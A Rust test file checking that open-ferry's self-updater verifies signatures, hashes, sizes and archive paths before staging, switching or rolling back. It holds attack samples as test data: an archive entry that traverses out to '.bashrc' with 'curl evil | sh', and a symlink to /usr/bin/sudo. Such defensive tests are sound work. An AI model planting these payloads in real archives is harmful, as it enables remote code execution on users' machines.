//! Not upstream's: checks, staging, switches and rollbacks against a
//! release server on 127.0.0.1, with keys made for each test.

use std::fs;
use std::sync::Arc;
use std::sync::atomic::Ordering;

use open_ferry_core::config::{SelfUpdate, SelfUpdateMode};

use super::support::*;
use crate::archive::ArchiveError;
use crate::fetch::FetchError;
use crate::install::{Install, NotSelfUpdating};
use crate::keys::{ReleaseKeys, VerifyError};
use crate::release::ReleaseError;
use crate::settings::Settings;
use crate::updater::{Report, UpdateError};

fn settings(mode: &str) -> Settings {
    Settings::resolve(
        &SelfUpdate {
            mode: mode.to_owned(),
            check_every: String::new(),
        },
        None,
    )
}

#[tokio::test]
async fn a_newer_release_is_checked_staged_and_switched_to() {
    let f = Fixture::new().await;
    f.release("0.2.0");

    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::Staged {
            version: "0.2.0".into()
        }
    );
    assert!(result.news);
    let mut paths: Vec<String> = LIST_PATHS.iter().map(ToString::to_string).collect();
    paths.push(f.archive_path("0.2.0"));
    assert_eq!(f.server.paths(), paths);
    assert!(
        f.server
            .user_agents()
            .iter()
            .all(|agent| agent == crate::USER_AGENT)
    );
    assert_eq!(f.runner.runs.load(Ordering::SeqCst), 1);
    // Staged, not switched.
    let staged = f.data.binary("0.2.0", "open-ferry");
    assert_eq!(fs::read(&staged).unwrap(), good_binary("0.2.0"));
    assert_eq!(f.installed_text(), "open-ferry 0.1.0");
    let state = f.updater.state();
    assert_eq!(state.staged.as_deref(), Some("0.2.0"));
    assert_eq!(state.latest.as_deref(), Some("0.2.0"));
    assert_eq!(state.last_result.as_deref(), Some("staged"));
    assert!(state.last_check.is_some());
    let status = f.updater.status(&settings("auto"), &f.updater.install());
    assert_eq!(status.staged_version.as_deref(), Some("0.2.0"));
    assert!(status.update_available);
    assert!(!status.restart_needed);

    // Checked again: nothing downloaded but the list, and no news.
    let again = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(again.report, result.report);
    assert!(!again.news);
    assert_eq!(f.server.requests(), 5);

    // The switch.
    let lock = f.updater.lock().unwrap();
    let mut state = f.updater.state();
    let record = f.updater.switch_to_staged(&mut state).unwrap();
    drop(lock);
    assert_eq!(
        (record.from.as_str(), record.to.as_str()),
        ("0.1.0", "0.2.0")
    );
    assert_eq!(record.how, "update");
    assert!(record.restart_needed);
    assert_eq!(f.installed_text(), "open-ferry 0.2.0");
    assert_eq!(
        fs::read(f.data.binary("0.1.0", "open-ferry")).unwrap(),
        good_binary("0.1.0")
    );
    let state = f.updater.state();
    assert_eq!(state.staged, None);
    assert_eq!(state.previous.as_deref(), Some("0.1.0"));
    assert_eq!(f.updater.installed_version(&state), "0.2.0");
    let status = f.updater.status(&settings("auto"), &f.updater.install());
    assert_eq!(status.installed_version, "0.2.0");
    assert_eq!(status.running_version, "0.1.0");
    assert!(status.restart_needed);
    assert!(!status.update_available);
    // No leftovers beside the installed binary.
    let names: Vec<String> = fs::read_dir(f.installed.parent().unwrap())
        .unwrap()
        .map(|entry| entry.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(names, ["open-ferry"]);

    // The installed version is the latest now.
    let after = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        after.report,
        Report::UpToDate {
            latest: "0.2.0".into()
        }
    );
}

#[tokio::test]
async fn windows_takes_the_zip_and_its_exe() {
    let f = Fixture::for_target(WINDOWS).await;
    f.release("0.2.0");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert!(matches!(result.report, Report::Staged { .. }));
    assert!(f.server.paths().contains(&f.archive_path("0.2.0")));
    assert!(f.archive_path("0.2.0").ends_with(".zip"));
    assert_eq!(
        fs::read(f.data.binary("0.2.0", "open-ferry.exe")).unwrap(),
        good_binary("0.2.0")
    );
}

#[tokio::test]
async fn musl_takes_the_musl_archive() {
    let f = Fixture::for_target(MUSL).await;
    let archives = [
        (
            archive_name("0.2.0", LINUX),
            release_archive("0.2.0", LINUX, b"#fail: the gnu build"),
        ),
        (
            archive_name("0.2.0", MUSL),
            release_archive("0.2.0", MUSL, &good_binary("0.2.0")),
        ),
    ];
    f.server.publish(&f.key, "0.2.0", &archives);
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert!(matches!(result.report, Report::Staged { .. }));
    let paths = f.server.paths();
    assert_eq!(paths.last().unwrap(), &f.archive_path("0.2.0"));
    assert!(
        paths
            .last()
            .unwrap()
            .ends_with("-x86_64-unknown-linux-musl.tar.gz")
    );
}

/// Checks in auto mode and expects `error`, nothing staged and no archive
/// downloaded.
async fn refused(f: &Fixture) -> UpdateError {
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(
        f.server
            .paths()
            .iter()
            .all(|path| !path.starts_with("/releases/download/")),
        "{:?}",
        f.server.paths()
    );
    assert!(f.data.kept_versions().is_empty());
    let state = f.updater.state();
    assert_eq!(state.staged, None);
    assert_eq!(state.last_result.as_deref(), Some("error"));
    assert_eq!(state.last_error, Some(error.to_string()));
    error
}

#[tokio::test]
async fn an_unsigned_release_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let sums = sums_line(&archive, &name);
    f.server
        .publish_raw("0.2.0", sums.as_bytes(), None, &[(name, archive)]);
    let error = refused(&f).await;
    assert!(matches!(
        error,
        UpdateError::Fetch {
            what: "SHA256SUMS.minisig",
            error: FetchError::Status(404)
        }
    ));
}

#[tokio::test]
async fn a_signature_that_isnt_one_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let sums = sums_line(&archive, &name);
    f.server.publish_raw(
        "0.2.0",
        sums.as_bytes(),
        Some("not a signature"),
        &[(name, archive)],
    );
    assert!(matches!(
        refused(&f).await,
        UpdateError::Verify(VerifyError::Malformed)
    ));
}

#[tokio::test]
async fn a_release_signed_with_another_key_is_refused() {
    let f = Fixture::new().await;
    let other = TestKey::new();
    let archives = [(
        archive_name("0.2.0", LINUX),
        release_archive("0.2.0", LINUX, &good_binary("0.2.0")),
    )];
    f.server.publish(&other, "0.2.0", &archives);
    let error = refused(&f).await;
    assert!(matches!(
        error,
        UpdateError::Verify(VerifyError::UnknownKey)
    ));
    assert!(error.to_string().contains("a key this build doesn't trust"));
}

#[tokio::test]
async fn a_release_signed_with_the_second_key_is_accepted() {
    let mut f = Fixture::new().await;
    let next = TestKey::new();
    f.updater.keys = trusting(&[&f.key, &next]);
    let archives = [(
        archive_name("0.2.0", LINUX),
        release_archive("0.2.0", LINUX, &good_binary("0.2.0")),
    )];
    f.server.publish(&next, "0.2.0", &archives);
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert!(matches!(result.report, Report::Staged { .. }));
}

#[tokio::test]
async fn a_list_changed_after_signing_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let sums = sums_line(&archive, &name);
    let signature = f.key.sign(sums.as_bytes(), "open-ferry 0.2.0 SHA256SUMS");
    let changed = sums.replace(&sums[..8], "00000000");
    f.server.publish_raw(
        "0.2.0",
        changed.as_bytes(),
        Some(&signature),
        &[(name, archive)],
    );
    assert!(matches!(
        refused(&f).await,
        UpdateError::Verify(VerifyError::BadSignature)
    ));
}

#[tokio::test]
async fn a_trusted_comment_naming_another_version_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let sums = sums_line(&archive, &name);
    // Signed as 0.3.0's list, but listing 0.2.0.
    let signature = f.key.sign(sums.as_bytes(), "open-ferry 0.3.0 SHA256SUMS");
    f.server.publish_raw(
        "0.2.0",
        sums.as_bytes(),
        Some(&signature),
        &[(name, archive)],
    );
    assert!(matches!(
        refused(&f).await,
        UpdateError::Release(ReleaseError::OtherVersion { .. })
    ));

    // A comment that names no version.
    let signature = f.key.sign(sums.as_bytes(), "timestamp:1791460800");
    f.server
        .publish_raw("0.2.0", sums.as_bytes(), Some(&signature), &[]);
    assert!(matches!(
        refused(&f).await,
        UpdateError::Release(ReleaseError::TrustedComment(_))
    ));
}

#[tokio::test]
async fn a_legacy_signature_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let sums = sums_line(&archive, &name);
    let signature = f.key.sign(sums.as_bytes(), "open-ferry 0.2.0 SHA256SUMS");
    let legacy = as_legacy(&signature);
    f.server
        .publish_raw("0.2.0", sums.as_bytes(), Some(&legacy), &[(name, archive)]);
    assert!(matches!(
        refused(&f).await,
        UpdateError::Verify(VerifyError::Legacy)
    ));
}

/// `signature` marked as minisign's legacy kind (`Ed` for `ED`).
fn as_legacy(signature: &str) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let index = |c: u8| ALPHABET.iter().position(|&a| a == c).unwrap() as u32;
    let mut lines: Vec<String> = signature.lines().map(ToString::to_string).collect();
    let line = &mut lines[1];
    let quad = line.as_bytes()[..4].to_vec();
    let bits = quad.iter().fold(0u32, |bits, &c| (bits << 6) | index(c));
    let mut bytes = [(bits >> 16) as u8, (bits >> 8) as u8, bits as u8];
    assert_eq!(&bytes[..2], b"ED");
    bytes[1] = b'd';
    let bits = (u32::from(bytes[0]) << 16) | (u32::from(bytes[1]) << 8) | u32::from(bytes[2]);
    let encoded: String = (0..4)
        .rev()
        .map(|n| ALPHABET[((bits >> (6 * n)) & 63) as usize] as char)
        .collect();
    line.replace_range(..4, &encoded);
    lines.join("\n") + "\n"
}

#[tokio::test]
async fn an_archive_that_doesnt_match_its_hash_is_refused() {
    let f = Fixture::new().await;
    let archive = release_archive("0.2.0", LINUX, &good_binary("0.2.0"));
    let name = archive_name("0.2.0", LINUX);
    let other = release_archive("0.2.0", LINUX, b"something else");
    let sums = sums_line(&other, &name);
    let signature = f.key.sign(sums.as_bytes(), "open-ferry 0.2.0 SHA256SUMS");
    f.server.publish_raw(
        "0.2.0",
        sums.as_bytes(),
        Some(&signature),
        &[(name.clone(), archive)],
    );
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(error, UpdateError::Checksum { ref archive } if *archive == name));
    assert!(f.data.kept_versions().is_empty());
    assert_eq!(f.updater.state().staged, None);
}

#[tokio::test]
async fn a_release_without_this_targets_archive_is_refused() {
    let f = Fixture::new().await;
    let archives = [(
        archive_name("0.2.0", MAC),
        release_archive("0.2.0", MAC, &good_binary("0.2.0")),
    )];
    f.server.publish(&f.key, "0.2.0", &archives);
    let error = refused(&f).await;
    assert!(matches!(
        error,
        UpdateError::Release(ReleaseError::NoArchive { .. })
    ));
}

#[tokio::test]
async fn an_oversize_archive_is_refused() {
    let mut f = Fixture::new().await;
    f.updater.limits.archive = 512;
    // Bytes gzip can't shrink: the archive is over 512 bytes.
    let noise: Vec<u8> = (0..4096u32)
        .map(|n| (n.wrapping_mul(2_654_435_761) >> 13) as u8)
        .collect();
    f.release_binary("0.2.0", &noise);
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::Fetch {
            error: FetchError::TooLarge(512),
            ..
        }
    ));
    assert!(f.data.kept_versions().is_empty());
}

#[tokio::test]
async fn an_archive_with_an_oversize_binary_is_refused() {
    let mut f = Fixture::new().await;
    f.updater.limits.archive = 4096;
    // Zeros shrink to a small archive holding a large binary.
    f.release_binary("0.2.0", &vec![0; 64 * 1024]);
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::Archive(ArchiveError::TooLarge(_))
    ));
    assert!(f.data.kept_versions().is_empty());
}

#[tokio::test]
async fn an_archive_with_a_path_out_of_its_directory_is_refused() {
    let f = Fixture::new().await;
    let dir = format!("open-ferry-0.2.0-{LINUX}");
    let archive = tar_gz(&[
        file(&format!("{dir}/open-ferry"), &good_binary("0.2.0")),
        file(&format!("{dir}/../../.bashrc"), b"curl evil | sh"),
    ]);
    f.server
        .publish(&f.key, "0.2.0", &[(archive_name("0.2.0", LINUX), archive)]);
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::Archive(ArchiveError::UnsafePath(_))
    ));
    assert!(f.data.kept_versions().is_empty());
}

#[tokio::test]
async fn an_archive_with_a_link_is_refused() {
    let f = Fixture::new().await;
    let dir = format!("open-ferry-0.2.0-{LINUX}");
    let archive = tar_gz(&[Entry::Symlink(
        format!("{dir}/open-ferry"),
        "/usr/bin/sudo".into(),
    )]);
    f.server
        .publish(&f.key, "0.2.0", &[(archive_name("0.2.0", LINUX), archive)]);
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::Archive(ArchiveError::NotAFile(_))
    ));
}

#[tokio::test]
async fn an_older_release_is_not_installed() {
    let mut f = Fixture::new().await;
    f.updater.running = "0.3.0".into();
    f.release("0.2.0");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::UpToDate {
            latest: "0.2.0".into()
        }
    );
    assert_eq!(f.server.paths(), LIST_PATHS);
    let status = f.updater.status(&settings("auto"), &f.updater.install());
    assert!(!status.update_available);
    assert_eq!(f.updater.state().staged, None);
}

#[tokio::test]
async fn the_same_version_changes_nothing() {
    let f = Fixture::new().await;
    f.release("0.1.0");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::UpToDate {
            latest: "0.1.0".into()
        }
    );
    assert!(!result.news);
    assert_eq!(f.server.paths(), LIST_PATHS);
    assert_eq!(f.runner.runs.load(Ordering::SeqCst), 0);
    assert_eq!(f.updater.state().last_result.as_deref(), Some("up-to-date"));
}

#[tokio::test]
async fn a_prerelease_is_ignored() {
    let f = Fixture::new().await;
    f.release("0.2.0-rc.1");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert!(matches!(result.report, Report::UpToDate { .. }));
    assert_eq!(f.server.paths(), LIST_PATHS);
    assert_eq!(f.updater.state().staged, None);
}

#[tokio::test]
async fn a_binary_that_fails_its_version_run_is_skipped_until_a_newer_release() {
    let f = Fixture::new().await;
    f.release_binary("0.2.0", b"#fail");
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::StagedBinaryFailed { ref version, .. } if version == "0.2.0"
    ));
    assert!(error.to_string().contains("skipped until a newer release"));
    assert!(!f.data.version_dir("0.2.0").exists());
    let state = f.updater.state();
    assert_eq!(state.failed, ["0.2.0"]);
    assert_eq!(state.staged, None);

    // Skipped: the list is read, the archive isn't downloaded again.
    let before = f.server.requests();
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::SkippedFailed {
            version: "0.2.0".into()
        }
    );
    assert_eq!(f.server.requests(), before + 2);
    let second = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert!(!second.news);

    // A newer release is staged.
    f.release("0.3.0");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::Staged {
            version: "0.3.0".into()
        }
    );
}

#[tokio::test]
async fn a_binary_printing_another_version_fails_its_check() {
    let f = Fixture::new().await;
    f.release_binary("0.2.0", &good_binary("0.1.9"));
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(error, UpdateError::StagedBinaryFailed { .. }));
    assert!(error.to_string().contains("open-ferry 0.1.9"));
}

#[tokio::test]
async fn a_check_is_refused_while_another_holds_the_lock() {
    let f = Fixture::new().await;
    f.release("0.2.0");
    let lock = f.updater.lock().unwrap();
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(error, UpdateError::Busy));
    assert_eq!(f.server.requests(), 0);
    drop(lock);
    assert!(f.updater.check(SelfUpdateMode::Auto).await.is_ok());
}

#[tokio::test]
async fn notify_mode_only_reports() {
    let f = Fixture::new().await;
    f.release("0.2.0");
    let result = f.updater.check(SelfUpdateMode::Notify).await.unwrap();
    assert_eq!(
        result.report,
        Report::Available {
            version: "0.2.0".into(),
            why_not: None
        }
    );
    assert!(result.news);
    assert_eq!(f.server.paths(), LIST_PATHS);
    assert!(f.data.kept_versions().is_empty());
    assert_eq!(
        f.updater.state().last_result.as_deref(),
        Some("update-available")
    );
    // Reported once.
    let again = f.updater.check(SelfUpdateMode::Notify).await.unwrap();
    assert!(!again.news);
}

#[tokio::test]
async fn an_install_that_doesnt_update_itself_only_reports_in_auto_mode() {
    let f = Fixture::new().await;
    // The receipt names another copy.
    let other = f.temp.path().join("elsewhere");
    fs::create_dir_all(&other).unwrap();
    let other = other.join("open-ferry");
    fs::write(&other, "open-ferry 0.1.0").unwrap();
    write_receipt(&f.data, &other);
    f.release("0.2.0");
    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    let Report::Available {
        why_not: Some(why), ..
    } = &result.report
    else {
        panic!("{:?}", result.report);
    };
    assert_eq!(why.code(), "other-binary");
    assert_eq!(result.report.result_name(), "cannot-update");
    assert_eq!(f.server.paths(), LIST_PATHS);
    assert!(f.data.kept_versions().is_empty());
}

#[tokio::test]
async fn a_build_with_no_key_makes_no_request() {
    let mut f = Fixture::new().await;
    f.updater.keys = ReleaseKeys::none();
    f.release("0.2.0");
    let error = f.updater.check(SelfUpdateMode::Auto).await.unwrap_err();
    assert!(matches!(
        error,
        UpdateError::Verify(VerifyError::NoTrustedKey)
    ));
    assert!(error.to_string().contains("trusts no release key"));
    assert_eq!(f.server.requests(), 0);
    let status = f.updater.status(&settings("auto"), &f.updater.install());
    assert!(!status.trusts_release_key);
    assert_eq!(status.last_error, Some(error.to_string()));
}

/// Stages 0.2.0 and switches to it.
async fn switched(f: &Fixture) {
    f.release("0.2.0");
    f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    let _lock = f.updater.lock().unwrap();
    let mut state = f.updater.state();
    f.updater.switch_to_staged(&mut state).unwrap();
}

#[tokio::test]
async fn a_rollback_goes_back_and_the_version_left_is_skipped() {
    let f = Fixture::new().await;
    switched(&f).await;
    assert_eq!(f.installed_text(), "open-ferry 0.2.0");
    let requests = f.server.requests();

    let lock = f.updater.lock().unwrap();
    let mut state = f.updater.state();
    let record = f.updater.rollback(&mut state).await.unwrap();
    drop(lock);
    assert_eq!(
        (record.from.as_str(), record.to.as_str()),
        ("0.2.0", "0.1.0")
    );
    assert_eq!(record.how, "rollback");
    // Back to the running version: no restart needed.
    assert!(!record.restart_needed);
    assert_eq!(f.installed_text(), "open-ferry 0.1.0");
    assert_eq!(
        f.server.requests(),
        requests,
        "a rollback downloads nothing"
    );
    let state = f.updater.state();
    assert_eq!(state.rolled_back.as_deref(), Some("0.2.0"));
    assert_eq!(state.previous.as_deref(), Some("0.2.0"));
    assert_eq!(f.updater.installed_version(&state), "0.1.0");
    assert!(f.data.binary("0.2.0", "open-ferry").is_file());

    let result = f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    assert_eq!(
        result.report,
        Report::SkippedRolledBack {
            version: "0.2.0".into()
        }
    );
    assert_eq!(f.updater.state().staged, None);
}

#[tokio::test]
async fn a_rollback_needs_an_earlier_switch() {
    let f = Fixture::new().await;
    let mut state = f.updater.state();
    let error = f.updater.rollback(&mut state).await.unwrap_err();
    assert!(matches!(error, UpdateError::NoPrevious));
}

#[tokio::test]
async fn a_staged_binary_changed_since_its_check_isnt_switched_to() {
    let f = Fixture::new().await;
    f.release("0.2.0");
    f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    fs::write(f.data.binary("0.2.0", "open-ferry"), "tampered").unwrap();
    let mut state = f.updater.state();
    let error = f.updater.switch_to_staged(&mut state).unwrap_err();
    assert!(matches!(error, UpdateError::StagedChanged { .. }));
    assert_eq!(f.installed_text(), "open-ferry 0.1.0");
    assert_eq!(f.updater.state().staged, None);
    assert!(!f.data.version_dir("0.2.0").exists());
}

#[tokio::test]
async fn nothing_staged_is_nothing_to_switch_to() {
    let f = Fixture::new().await;
    let mut state = f.updater.state();
    assert!(matches!(
        f.updater.switch_to_staged(&mut state),
        Err(UpdateError::NothingStaged)
    ));
}

#[tokio::test]
async fn an_install_that_doesnt_update_itself_isnt_switched() {
    let mut f = Fixture::new().await;
    f.release("0.2.0");
    f.updater.check(SelfUpdateMode::Auto).await.unwrap();
    f.updater.system = Arc::new(FakeSystem {
        exe: f.installed.clone(),
        container: true,
        writable: true,
    });
    let mut state = f.updater.state();
    let error = f.updater.switch_to_staged(&mut state).unwrap_err();
    assert!(matches!(
        error,
        UpdateError::NotSelfUpdating(NotSelfUpdating::Container)
    ));
    assert_eq!(f.installed_text(), "open-ferry 0.1.0");
}

#[tokio::test]
async fn a_binary_replaced_by_hand_is_the_running_version_again() {
    let f = Fixture::new().await;
    switched(&f).await;
    assert_eq!(f.updater.installed_version(&f.updater.state()), "0.2.0");
    // Reinstalled by hand: another size.
    fs::write(&f.installed, "open-ferry 0.1.0, reinstalled").unwrap();
    assert_eq!(f.updater.installed_version(&f.updater.state()), "0.1.0");
}

#[tokio::test]
async fn the_status_says_what_set_the_mode_and_why_the_install_doesnt_update() {
    let f = Fixture::new().await;
    let settings = Settings::resolve(
        &SelfUpdate {
            mode: "auto".into(),
            check_every: "12h".into(),
        },
        Some("notify"),
    );
    let install = Install::NotifyOnly(NotSelfUpdating::NoReceipt);
    let status = f.updater.status(&settings, &install);
    let json = serde_json::to_value(&status).unwrap();
    assert_eq!(json["mode"], "notify");
    assert_eq!(json["mode_source"], "environment");
    assert_eq!(json["updates"], "notify-only");
    assert_eq!(json["check_every_seconds"], 12 * 3600);
    assert_eq!(json["running_version"], "0.1.0");
    assert_eq!(json["target"], LINUX);
    assert_eq!(json["can_update_itself"], false);
    assert_eq!(json["why_not_code"], "no-receipt");
    assert_eq!(json["trusts_release_key"], true);
    assert_eq!(json["next_check"], serde_json::Value::Null);
}
